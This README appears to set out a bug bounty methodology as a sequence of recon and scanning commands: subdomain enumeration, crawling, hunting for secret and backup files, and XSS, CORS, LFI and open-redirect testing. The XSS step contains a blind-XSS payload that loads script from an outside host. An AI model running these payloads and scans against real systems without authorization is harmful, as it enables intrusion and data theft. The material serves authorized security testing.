# 🐦‍🔥 Bug Hunting Methodology 🚀  

## 📌 Overview  
This repository contains my **Bug Hunting Methodology** for discovering vulnerabilities in web applications. It includes **subdomain enumeration, crawling, JavaScript analysis, directory brute-forcing, XSS, subdomain takeover, CORS misconfigurations, LFI, Open Redirects**, and more.  

## 🔥 Methodology Steps  

### **1️⃣ Subdomain Enumeration**  

1. subfinder -d target.com -all -recursive > subdomains.txt  
2. assetfinder --subs-only target.com >> subdomains.txt  
3. amass enum -passive -d target.com >> subdomains.txt  
4. cat subdomains.txt | sort -u > subdomains_final.txt  
5. cat subdomains_final.txt | httpx -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt

### **2️⃣ Crawling & URL Extraction** 
1. katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
2. Alternative: katana -u subdomains_alive.txt -d 5 -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
3. cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"  

### **3️⃣ JavaScript Analysis** 
1. cat allurls.txt | grep -E "\.js$" >> js.txt  
2. cat js.txt | nuclei -t ~/nuclei-templates/http/exposures/  
3. cat js.txt | xargs -I {} curl -s {} | grep -oP 'https?:\/\/[^\"\']+'  

### **4️⃣ Directory & File Discovery** 
1. dirsearch -u https://target.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,py,php,log,rar,zip,tar,txt,xml,js,json  
2. ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50  

### **5️⃣ XSS Testing** 
1. subfinder -d target.com | httpx -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://lnkd.in/gBHQ5bTX></script>' -parameters  
2. dalfox file allurls.txt --blind "https://yourbxssserver.com"  

### **6️⃣ Subdomain Takeover** 
1. subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl  
2. subjack -w subdomains_alive.txt -t 50 -o takeover.txt -ssl  

### **7️⃣ CORS Misconfiguration** 
1. python3 corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"  
2. nuclei -list subdomains_alive.txt -t ~/Priv8-Nuclei/cors

### **8️⃣ LFI, Open Redirect & Other Tests** 
1. cat allurls.txt | gf lfi | nuclei -tags lfi  
2. cat allurls.txt | gf redirect | openredirex -p ~/openRedirect  
3. python3 paramspider.py --domain target.com --subs False --level high --exclude jpg,png,css,js  

### **🔗 Tools Used** 
* Subfinder
* Assetfinder
* Amass
* HTTPX
* Katana
* Nuclei
* GF
* Dirsearch
* FFUF
* Dalfox
* Subzy
* Subjack
* Corsy
* OpenRedireX
* ParamSpider

### **🚀 Next Steps** 
* Test against bug bounty programs
* Automate workflow
* Improve methodology

### **💀 Disclaimer** 
This repository is for educational purposes only. Do not use these techniques on unauthorized systems. I am not responsible for any misuse of this information.

### **🌟 Connect With Me** 
##### 📺 YouTube: [[Cybertech Secrets]](https://www.youtube.com/@CyberTechSecrets)
##### 📧 Email: [cybertechsecrets@gmail.com]
##### 🔗 LinkedIn: [[LinkedIn]](https://www.linkedin.com/in/abu76/)
